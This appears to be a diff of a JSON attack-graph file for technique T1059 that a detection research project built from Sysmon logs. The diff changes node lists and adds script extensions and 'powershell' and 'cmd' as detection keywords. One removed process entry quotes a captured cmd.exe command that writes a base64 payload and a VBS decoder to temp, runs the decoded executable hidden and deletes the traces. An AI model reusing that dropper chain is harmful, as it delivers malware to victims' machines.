@@ -2,13 +2,13 @@
   "schema_version": 1,
   "kind": "pure_attack_tree",
   "technique": "T1059",
-  "generated_at_utc": "2026-05-08T17:45:37.700290+00:00",
-  "source_file": "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059\\autoit\\sysmon.log",
+  "generated_at_utc": "2026-05-08T20:10:55.845081+00:00",
+  "source_file": "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1059\\autoit\\sysmon.log",
   "source_files": [
-    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059\\autoit\\sysmon.log",
-    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059\\metasploit\\apachebench_windows-sysmon.log",
-    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059\\path_traversal\\sysmon.log",
-    "D:\\NCKH_new\\attack_data_full\\datasets\\attack_techniques\\T1059\\suspiciously_named_executables\\windows-sysmon.log"
+    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1059\\autoit\\sysmon.log",
+    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1059\\metasploit\\apachebench_windows-sysmon.log",
+    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1059\\path_traversal\\sysmon.log",
+    "D:\\Capstone Project & NCKH\\attack_data\\datasets\\attack_techniques\\T1059\\suspiciously_named_executables\\windows-sysmon.log"
   ],
   "patterns": {
     "malicious": [
@@ -30,9 +30,19 @@
       "explorer.exe"
     ],
     "core_effect": [
-      "autoit3.exe"
+      "autoit3.exe",
+      ".exe",
+      ".rb",
+      ".cs",
+      ".sct",
+      ".bat",
+      ".sh",
+      ".ps1",
+      "powershell",
+      "cmd",
+      ".pl"
     ],
-    "config_path": "D:\\NCKH_new\\muilti-graph\\inspect_log_gui\\data\\T1059_malcious_config.json"
+    "config_path": "D:\\Capstone Project & NCKH\\Multisource Attack Graph\\inspect_log_gui\\data\\T1059_malcious_config.json"
   },
   "matching": {
     "malicious_node_ids": [
@@ -53,17 +63,129 @@
       "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13"
     ],
     "core_effect_node_ids": [
+      "File:03b07ab41877545d69a8c957deba2c485d188e76edbd0a5f13153c50aa7f3d9c:7",
+      "File:06f632cae2bed7616797c0603a9502bf7f67eb41b717e221d150252f09a0178a:7",
+      "File:0df9c3a0af1e8dceadce9ae58ba14fd5f278ddd551818363f6703b9fec87a63a:7",
+      "File:1243375dbdd9510e3f2a74b8f10f7e82b5108f549e5537481acc53b7b22a1371:7",
+      "File:19472e477d247f4145673e38acf57b83f708b61266308dea6f4e2b3b47b7ce59:7",
+      "File:1a64dc42a80b3d4d6a553fab4139c1b8b3a24b3dd61de136f0248a95f5439ec8:7",
+      "File:1e1142cef1f05bc99765a570ef2232528c20dc9492224f4ce842010205a0cb7e:7",
+      "File:25eb2ad12b01d54dead643df6897050fe567db769e181cfbc8b8dc4a9f2c663d:7",
       "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:11",
       "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:2",
+      "File:345cc4c9e992852492c67ebe1ea84b386f544987357637e81a68fc6a1dd565eb:23",
+      "File:48f5018ad5b31eaf4d3dd9eb855d3ee1a1d584ff46a3d96b243bf969e345b57e:7",
       "File:4b2667fbbb71ee4e3a0f803d132679453426588f6694a2384547c0313f02a750:11",
+      "File:4d40a8b621a06f30abe4a4ecfd9129953992a18dfb481163b1bf9d434ee521dc:7",
+      "File:51746d85bb781942c7753d1a7b7f20e29ebe69d102fd210aa0f1d5f6bf494a26:7",
+      "File:5a289e2d35bd905b3d8596beffc7a058b461b74823d40d7fec2921104ac2b71b:7",
+      "File:5a905b745fbe168b04a88219950cfa8db2be5feefd5bfbb53fa28a3118c3c518:7",
+      "File:5b396e7b258ac2ab5c287606424aff814fe0933da2d449fcbe05d75390855977:7",
+      "File:5b462892012eff059a85498f6863d643217009c3f9e07f35e71e72b9134c1869:7",
+      "File:5ef6ede7fc52f18c989a50b8c1fc83f292271ab129254be2d651ff507f3d86dc:7",
+      "File:60537789c8273acb909fcba1d008a43b1f93b2a4adc2594cd58546a69435b679:7",
+      "File:68b3c8f8ab782e0642adc09bae2bacadb161b2fba9ead93f7569fc8ff03f0676:7",
+      "File:6b80b1388c0e5f36062264bb65cad88cb8a86f8eb7706f36a21f5e9dbf8b12eb:7",
+      "File:6c9cd8052a1d9bbea6f5f964319bddfc41479a7de312407f66e7a48010636597:7",
+      "File:6ebbb64bea5edda45f2ebec88a1e9fccdd18f0bb71f8ee368f48d97bdb323107:7",
+      "File:75c54a67b55d4a31673b95b66c27c171b9e9b821c978963ab9d94494b373afbd:7",
+      "File:77abe810d1269f32f687ff943423401bb4bc04fd3ef81832aff5fa2205478728:7",
+      "File:7fb66dd0e5d2c34be98c06a87e5227258fe8f1b20f8186a695cf39e707f77c28:7",
+      "File:800e466bba30b6e86d963cc81c687688dca4fd6aa7eb181e5c5271f4acc665b4:7",
+      "File:84580a45c98dd03107ab288a3c4b914a83eee307e0ed03fe2642ba289cbe9999:7",
+      "File:856a096b4541b3c6ec7d04df028d10e2741da85058a8ed76ebd04fa55cbf7cc9:7",
+      "File:884b181573300ba4a65b5ae721a3450db12c6c2d4fab187a3bc6e28ff8311ed9:7",
+      "File:8caf5629f62df53cef995683a47f7b26c06ec5de158fb4eacf233caa634e7f9b:7",
+      "File:8e512050a09269a582388dfc118e6a7dc379b69e80bf31dc1b7f63b2e4164fcb:7",
+      "File:9645a0699b090a2c814057f9add85dd0473c7d36ac237d47ac9d286dc2555430:7",
+      "File:97b05c81fb12b6b15a2bdca3ea2d98b3575d2b0f4610aaf5a55a83f668e45321:7",
+      "File:9b98cfde81579f143c149f476c990b387a8bc258f82e0836af7eaed8ef7013f1:7",
+      "File:9e3ffa11adf2daa2ca57aadcea100f1eced847277249401b7938105776b18088:7",
+      "File:ad9aa7ff27411b21a65c49f05a2992fbaed4e0812f2e7511e022d32f7bbdbb6b:7",
+      "File:b2417b1734ee183ac9dc7c9c068070461f1802f31d6dbf0007897e0c1b4ff239:7",
+      "File:b2a83787692d9f5ec141753f101524764ea3b8ed60a1bd0cd2417cd93829fff8:7",
+      "File:b60d30145077a0dc36fa59c19b14d53a86694490ed265c7f928ded3122ef373a:7",
+      "File:be5c25819bb814c9443eeafd3a441a908cd15501b91edb7c13ab2304a3f39fe1:7",
+      "File:c2afc323fb25fdc2c5f21d91eeb10777b966c0671f47cae94b3eee25b875a03c:7",
+      "File:c83e05d498ef9bc9b59328cc77c640d2b60c74f0cf68e83c5caba6b3e710a46f:23",
+      "File:ca831c7d333aad9ff81c44fc5d1bc90378fb228d606af936972f59c958047d36:7",
+      "File:ca8a989b8693094606e2550cdd95c843c5400a5abc4fd9a214ea6583a2251405:7",
+      "File:d000c4545f131a56947708a4d526e884a9bd6578c0ec2d735e4e4e23749c6df2:7",
+      "File:df0677fa96c4bd072aee7571b4d1a13a82525f4c426da71f54d024514ef0d4ec:7",
+      "File:eaf2da9d52e781ed01fb925d0408d3c284d0876a7df0e9685f75a2df715f33a2:7",
+      "File:eead7b06bae7b9f183f71b31f10adf7b03d52d14d93e4cedfcd27a24cbd9a042:7",
+      "File:f36dd5e1394f83f5aae60e7cffd44d71fb02a56e51383dcf00062a649005de26:7",
+      "File:f5265318b5f1148ffbbe24ca0307cef02f129ded08cbc18fb05497489ec1f5b5:7",
+      "File:f554777f756da45f3b15702376fb6163958555c5ce906ee07473cc27c12d441f:7",
+      "Process:{0BBB6F36-3642-6378-1200-000000009902}:1",
+      "Process:{0BBB6F36-3671-6378-9000-000000009902}:1",
+      "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
+      "Process:{0BBB6F36-7E64-637B-666B-010000009902}:1",
+      "Process:{0BBB6F36-7E64-637B-676B-010000009902}:1",
+      "Process:{0BBB6F36-7E64-637B-686B-010000009902}:1",
+      "Process:{326FD73D-A253-6294-0B00-000000005502}:1",
+      "Process:{326FD73D-A254-6294-0C00-000000005502}:1",
+      "Process:{326FD73D-A254-6294-0D00-000000005502}:1",
+      "Process:{326FD73D-A254-6294-0F00-000000005502}:1",
+      "Process:{326FD73D-A254-6294-1000-000000005502}:1",
+      "Process:{326FD73D-A254-6294-1100-000000005502}:1",
+      "Process:{326FD73D-A254-6294-1300-000000005502}:1",
+      "Process:{326FD73D-A254-6294-1500-000000005502}:10",
+      "Process:{326FD73D-A254-6294-1600-000000005502}:1",
+      "Process:{326FD73D-A254-6294-1600-000000005502}:10",
+      "Process:{326FD73D-A262-6294-2900-000000005502}:1",
+      "Process:{326FD73D-A262-6294-2900-000000005502}:10",
+      "Process:{326FD73D-A262-6294-2A00-000000005502}:1",
+      "Process:{326FD73D-A441-6294-EB00-000000005502}:1",
+      "Process:{326FD73D-A441-6294-EB00-000000005502}:10",
+      "Process:{326FD73D-A44B-6294-FD00-000000005502}:10",
+      "Process:{326FD73D-A44C-6294-0401-000000005502}:10",
+      "Process:{326FD73D-A4D7-6294-7701-000000005502}:1",
+      "Process:{326FD73D-AAC7-6294-6108-000000005502}:1",
+      "Process:{326FD73D-AAC7-6294-6108-000000005502}:10",
+      "Process:{326FD73D-AAC7-6294-6208-000000005502}:10",
+      "Process:{326FD73D-C0CE-6294-360B-000000005502}:1",
+      "Process:{326FD73D-C0CE-6294-360B-000000005502}:10",
+      "Process:{326FD73D-C0E2-6294-370B-000000005502}:1",
+      "Process:{326FD73D-C0E2-6294-370B-000000005502}:10",
+      "Process:{326FD73D-C13D-6294-460B-000000005502}:1",
+      "Process:{326FD73D-C13D-6294-460B-000000005502}:10",
+      "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
+      "Process:{6CA7D817-C96E-654B-0523-000000000A03}:1",
+      "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
       "Process:{6CA7D817-C990-654B-0B23-000000000A03}:1",
       "Process:{6CA7D817-C993-654B-0C23-000000000A03}:1",
       "Process:{6CA7D817-C999-654B-1223-000000000A03}:1",
+      "Process:{6CA7D817-CF8B-654B-D523-000000000A03}:1",
+      "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
+      "Process:{E265CAAD-CEE7-60AD-B5C4-00000000C501}:1",
+      "Registry:122ae646bf6365730ff4ee89f373e94690c5a1791cb2d162a07370b6ff8e6fcc:13",
       "Registry:154c2ac5a04a09ed204fff6ef689b8033d38b05415fa3655a024c15d9af039cf:13",
+      "Registry:2ddd646aaa316d03d533b42c1089fffa7bd2f5aed35d8ebc51f70842263cf3e7:13",
+      "Registry:3b99716a85bdcfc7380a166eaa14dc6da3d66a820bdb0c9869950053b76b1893:13",
+      "Registry:3f8b51ce5c5c31da0eeba07eec7b206637dba1be9718ca41b716fa0dfd8cfcb9:13",
+      "Registry:497ea93691c5c45023c9410ee11f0d0b1333abb047c770308b4e3387b603ddb8:13",
+      "Registry:5231989ed66af03c84681cd6698600090d2e61077edc6fbd14b697f2a878e7fb:13",
       "Registry:5a34b517650592974e04eb28b608bc6486c6f5b05e3b67d02a1d5ad76bdf5b30:13",
+      "Registry:61195190ca69c85e9b1a53a2634f3cdcc02f4e70f8cc51e6d691885b16a14624:13",
+      "Registry:6bd3b708be5df547477cfdca532cc5b56952ea633f82599b9d7e2dbbf8c21ad1:13",
       "Registry:8a2794b75d151512963bfa7d8c63a60245f9cfae9ffc6d182d036a4212e5ed03:13",
+      "Registry:8c48666c890cbc7feb1bdc152032903a5c6a3470d7184815f1cb62f03289196d:13",
       "Registry:8e8e092444a34a72f73f651c17795232fd413826b175170a1b09e0dbfc404aac:13",
-      "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13"
+      "Registry:8ea79cc9516d0ca42232778bbe94c67cb6c5a275753c29bda785357df6d85d86:13",
+      "Registry:b274f50e50750088a666bb5f9771f58d7643e461a5e4c227c96834e336215945:13",
+      "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13",
+      "network:52.109.76.30:443:tcp",
+      "network:<loopback_ip>:389:tcp",
+      "network:<loopback_ip>:50053:udp",
+      "network:<loopback_ip>:53:udp",
+      "network:<loopback_ip>:56925:udp",
+      "network:<loopback_ip>:62401:udp",
+      "network:<loopback_ip>:64545:udp",
+      "network:<private_ip>:135:tcp",
+      "network:<private_ip>:3389:tcp",
+      "network:<private_ip>:389:tcp",
+      "network:<private_ip>:53:udp"
     ],
     "whitelist_node_ids": [
       "File:03b07ab41877545d69a8c957deba2c485d188e76edbd0a5f13153c50aa7f3d9c:7",
@@ -147,203 +269,21 @@
   },
   "nodes": [
     {
-      "id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
-      "label": "svchost.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{6CA7D817-67D3-654A-1300-000000000A03}",
-        "pid": "1004",
-        "image_path": "%system32%\\svchost.exe",
-        "command_line": "",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "svchost.exe",
-        "name": "svchost.exe"
-      }
-    },
-    {
-      "id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
-      "label": "powershell.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{6CA7D817-C983-654B-0923-000000000A03}",
-        "pid": "4556",
-        "image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "command_line": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "powershell.exe",
-        "name": "powershell.exe"
-      }
-    },
-    {
-      "id": "Process:{0BBB6F36-7E64-637B-666B-010000009902}:1",
-      "label": "cmd.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "windows command processor",
-        "guid": "{0BBB6F36-7E64-637B-666B-010000009902}",
-        "pid": "19192",
-        "image_path": "%system32%\\cmd.exe",
-        "command_line": "%system32%\\cmd.exe\" \\c echo aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaatkixmaaaaaa2gmfkaqaaaem6xgxvy2fsmfxhc2zccmvszwfzzvxidwlszc0yljiumtrcc3vwcg9ydfxszwxlyxnlxgfilnbkyga=>>%temp%\\ofpmf.b64 & echo set fs = createobject(\"scripting.filesystemobject\") >>%temp%\\osyge.vbs & echo set file = fs.getfile(\"%temp%\\ofpmf.b64\") >>%temp%\\osyge.vbs & echo if file.size then >>%temp%\\osyge.vbs & echo set fd = fs.opentextfile(\"%temp%\\ofpmf.b64\", 1) >>%temp%\\osyge.vbs & echo data = fd.readall >>%temp%\\osyge.vbs & echo data = replace(data, vbcrlf, ) >>%temp%\\osyge.vbs & echo data = base64_decode(data) >>%temp%\\osyge.vbs & echo fd.close >>%temp%\\osyge.vbs & echo set ofs = createobject(\"scripting.filesystemobject\").opentextfile(\"%temp%\\wlszy.exe\", 2, true) >>%temp%\\osyge.vbs & echo ofs.write data >>%temp%\\osyge.vbs & echo ofs.close >>%temp%\\osyge.vbs & echo set shell = createobject(\"wscript.shell\") >>%temp%\\osyge.vbs & echo shell.run \"%temp%\\wlszy.exe\", 0, false >>%temp%\\osyge.vbs & echo else >>%temp%\\osyge.vbs & echo wscript.echo \"the file is empty.\" >>%temp%\\osyge.vbs & echo end if >>%temp%\\osyge.vbs & echo function base64_decode(byval strin) >>%temp%\\osyge.vbs & echo dim w1, w2, w3, w4, n, strout >>%temp%\\osyge.vbs & echo for n = 1 to len(strin) step 4 >>%temp%\\osyge.vbs & echo w1 = mimedecode(mid(strin, n, 1)) >>%temp%\\osyge.vbs & echo w2 = mimedecode(mid(strin, n + 1, 1)) >>%temp%\\osyge.vbs & echo w3 = mimedecode(mid(strin, n + 2, 1)) >>%temp%\\osyge.vbs & echo w4 = mimedecode(mid(strin, n + 3, 1)) >>%temp%\\osyge.vbs & echo if not w2 then _ >>%temp%\\osyge.vbs & echo strout = strout + chr(((w1 * 4 + int(w2 \\ 16)) and 255)) >>%temp%\\osyge.vbs & echo if not w3 then _ >>%temp%\\osyge.vbs & echo strout = strout + chr(((w2 * 16 + int(w3 \\ 4)) and 255)) >>%temp%\\osyge.vbs & echo if not w4 then _ >>%temp%\\osyge.vbs & echo strout = strout + chr(((w3 * 64 + w4) and 255)) >>%temp%\\osyge.vbs & echo next >>%temp%\\osyge.vbs & echo base64_decode = strout >>%temp%\\osyge.vbs & echo end function >>%temp%\\osyge.vbs & echo function mimedecode(byval strin) >>%temp%\\osyge.vbs & echo base64chars = \"abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz0123456789+\\\" >>%temp%\\osyge.vbs & echo if len(strin) = 0 then >>%temp%\\osyge.vbs & echo mimedecode = -1 : exit function >>%temp%\\osyge.vbs & echo else >>%temp%\\osyge.vbs & echo mimedecode = instr(base64chars, strin) - 1 >>%temp%\\osyge.vbs & echo end if >>%temp%\\osyge.vbs & echo end function >>%temp%\\osyge.vbs & cscript \\nologo %temp%\\osyge.vbs & del %temp%\\osyge.vbs & del %temp%\\ofpmf.b64",
-        "original_file_name": "cmd.exe",
-        "image_hash": "MD5=F4F684066175B77E0C3A000549D2922C,SHA256=935C1861DF1F4018D698E8B65ABFA02D7E9037D8F68CA3C2065B6CA165D44AD2",
-        "command_hash": "598cc6cc24c670e37bb694c54dc4a08a248411f256a39195832266085152ad9f",
-        "event_id": "1",
-        "id": "Process:{0BBB6F36-7E64-637B-666B-010000009902}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "cmd.exe",
-        "name": "cmd.exe",
-        "parent_process_id": "Process:{0BBB6F36-3E6E-6378-D612-000000009902}:1",
-        "user_id": "User:S-1-5-18"
-      }
-    },
-    {
-      "id": "Process:{E265CAAD-CEE7-60AD-B5C4-00000000C501}:1",
-      "label": "-",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "-",
-        "guid": "{E265CAAD-CEE7-60AD-B5C4-00000000C501}",
-        "pid": "2532",
-        "image_path": "%windir%\\xsljvqla.exe",
-        "command_line": "%windir%\\xsljvqla.exe",
-        "original_file_name": "-",
-        "image_hash": "MD5=6983F7001DE10F4D19FC2D794C3EB534,SHA256=3C2FE308C0A563E06263BBACF793BBE9B2259D795FCC36B953793A7E499E7F71,IMPHASH=4749670AC3D28D6761142B0DCB4F5076",
-        "command_hash": "1207b7d4fa1eca2494c6fdcbdba859d76035e268fd00f0c0ab9d6138c75ec488",
-        "parent_process_id": "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{E265CAAD-CEE7-60AD-B5C4-00000000C501}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "-",
-        "name": "-"
-      }
-    },
-    {
-      "id": "Process:{6CA7D817-C990-654B-0B23-000000000A03}:1",
-      "label": "autoit v3 script",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "autoit v3 script",
-        "guid": "{6CA7D817-C990-654B-0B23-000000000A03}",
-        "pid": "6424",
-        "image_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
-        "command_line": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
-        "original_file_name": "autoit3.exe",
-        "image_hash": "MD5=0ADB9B817F1DF7807576C2D7068DD931,SHA256=98E4F904F7DE1644E519D09371B8AFCBBF40FF3BD56D76CE4DF48479A4AB884B,IMPHASH=07F236B4003A1F1174171E18CAD3B475",
-        "command_hash": "3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d",
-        "parent_process_id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{6CA7D817-C990-654B-0B23-000000000A03}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "autoit v3 script",
-        "name": "autoit v3 script"
-      }
-    },
-    {
-      "id": "Process:{6CA7D817-C993-654B-0C23-000000000A03}:1",
-      "label": "autoit v3 script",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "autoit v3 script",
-        "guid": "{6CA7D817-C993-654B-0C23-000000000A03}",
-        "pid": "6592",
-        "image_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
-        "command_line": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe\" -h",
-        "original_file_name": "autoit3.exe",
-        "image_hash": "MD5=0ADB9B817F1DF7807576C2D7068DD931,SHA256=98E4F904F7DE1644E519D09371B8AFCBBF40FF3BD56D76CE4DF48479A4AB884B,IMPHASH=07F236B4003A1F1174171E18CAD3B475",
-        "command_hash": "b7458d948f5ebe4d4a78b25b45d7c26f5530f802523ab6ccdaa1d21fc807d9b0",
-        "parent_process_id": "Process:{6CA7D817-C983-654B-0923-000000000A03}:1",
-        "user_id": "User:S-1-5-18",
-        "event_id": "1",
-        "id": "Process:{6CA7D817-C993-654B-0C23-000000000A03}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "autoit v3 script",
-        "name": "autoit v3 script"
-      }
-    },
-    {
-      "id": "Registry:154c2ac5a04a09ed204fff6ef689b8033d38b05415fa3655a024c15d9af039cf:13",
-      "label": "Publisher",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
-        "value_name": "Publisher",
-        "value_data": "autoit team",
-        "source_image_path": "%system32%\\svchost.exe",
-        "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
-        "event_id": "13",
-        "id": "Registry:154c2ac5a04a09ed204fff6ef689b8033d38b05415fa3655a024c15d9af039cf:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "Publisher",
-        "name": "Publisher"
-      }
-    },
-    {
-      "id": "File:4b2667fbbb71ee4e3a0f803d132679453426588f6694a2384547c0313f02a750:11",
+      "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:11",
       "label": "autoit3.exe",
       "type": "file",
       "group": "File",
       "properties": {
-        "file_path": "%temp%\\2\\autoit-v3\\install\\autoit3.exe",
-        "source_image_path": "%system32%\\windowspowershell\\v1.0\\powershell.exe",
+        "file_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "source_image_path": "%programfiles%\\7-zip\\7zg.exe",
         "content_hash": "",
-        "parent_process_id": "Process:{6CA7D817-CF8B-654B-D523-000000000A03}:1",
+        "parent_process_id": "Process:{6CA7D817-C96E-654B-0523-000000000A03}:1",
         "event_id": "11",
-        "id": "File:4b2667fbbb71ee4e3a0f803d132679453426588f6694a2384547c0313f02a750:11",
+        "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:11",
         "type": "File",
         "entity_class": "FileEntity",
         "display_name": "autoit3.exe",
         "name": "autoit3.exe"
-      }
-    },
-    {
-      "id": "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13",
-      "label": "BinProductVersion",
-      "type": "registry",
-      "group": "Registry",
-      "properties": {
-        "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
-        "value_name": "BinProductVersion",
-        "value_data": "3.3.16.1",
-        "source_image_path": "%system32%\\svchost.exe",
-        "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
-        "event_id": "13",
-        "id": "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13",
-        "type": "Registry",
-        "entity_class": "RegistryEntity",
-        "display_name": "BinProductVersion",
-        "name": "BinProductVersion"
       }
     },
     {
@@ -371,186 +311,22 @@
       }
     },
     {
-      "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:11",
-      "label": "autoit3.exe",
-      "type": "file",
-      "group": "File",
-      "properties": {
-        "file_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
-        "source_image_path": "%programfiles%\\7-zip\\7zg.exe",
-        "content_hash": "",
-        "parent_process_id": "Process:{6CA7D817-C96E-654B-0523-000000000A03}:1",
-        "event_id": "11",
-        "id": "File:3435adff43b1062fd260cfe636e9a061cd4492fa82c6cc9a0669f3058754737d:11",
-        "type": "File",
-        "entity_class": "FileEntity",
-        "display_name": "autoit3.exe",
-        "name": "autoit3.exe"
-      }
-    },
-    {
-      "id": "Registry:8e8e092444a34a72f73f651c17795232fd413826b175170a1b09e0dbfc404aac:13",
-      "label": "LowerCaseLongPath",
+      "id": "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13",
+      "label": "BinProductVersion",
       "type": "registry",
       "group": "Registry",
       "properties": {
         "key_path": "\\REGISTRY\\A\\<CLSID>\\ROOT\\INVENTORYAPPLICATIONFILE\\AUTOIT3.EXE|DD51BB0D5F6FC5AC",
-        "value_name": "LowerCaseLongPath",
-        "value_data": "c:\\users\\administrator\\downloads\\autoit-v3\\install\\autoit3.exe",
+        "value_name": "BinProductVersion",
+        "value_data": "3.3.16.1",
         "source_image_path": "%system32%\\svchost.exe",
         "parent_process_id": "Process:{6CA7D817-67D3-654A-1300-000000000A03}:1",
         "event_id": "13",
-        "id": "Registry:8e8e092444a34a72f73f651c17795232fd413826b175170a1b09e0dbfc404aac:13",
+        "id": "Registry:d48ef347b3de95464ce52f1d93579e8c7a28c86029de7949c53bb293c332b7dc:13",
         "type": "Registry",
         "entity_class": "RegistryEntity",
-        "display_name": "LowerCaseLongPath",
-        "name": "LowerCaseLongPath"
-      }
-    },
-    {
-      "id": "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
-      "label": "services.exe",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "",
-        "guid": "{E265CAAD-7839-60A7-0A00-00000000C501}",
-        "pid": "532",
-        "image_path": "%system32%\\services.exe",
-        "command_line": "%system32%\\services.exe",
-        "original_file_name": "",
-        "image_hash": "",
-        "command_hash": "",
-        "parent_process": null,
-        "user": null,
-        "event_id": "1",
-        "id": "Process:{E265CAAD-7839-60A7-0A00-00000000C501}:1",
-        "type": "Process",
-        "entity_class": "ProcessEntity",
-        "display_name": "services.exe",
-        "name": "services.exe"
-      }
-    },
-    {
-      "id": "Process:{6CA7D817-C999-654B-1223-000000000A03}:1",
-      "label": "autoit v3 script",
-      "type": "process",
-      "group": "Process",
-      "properties": {
-        "process_name": "autoit v3 script",
-        "guid": "{6CA7D817-C999-654B-1223-000000000A03}",
-        "pid": "6884",
-        "image_path": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe",
-        "command_line": "%userprofile%\\downloads\\autoit-v3\\install\\autoit3.exe\" help",
-        "original_file_name": "autoit3.exe",
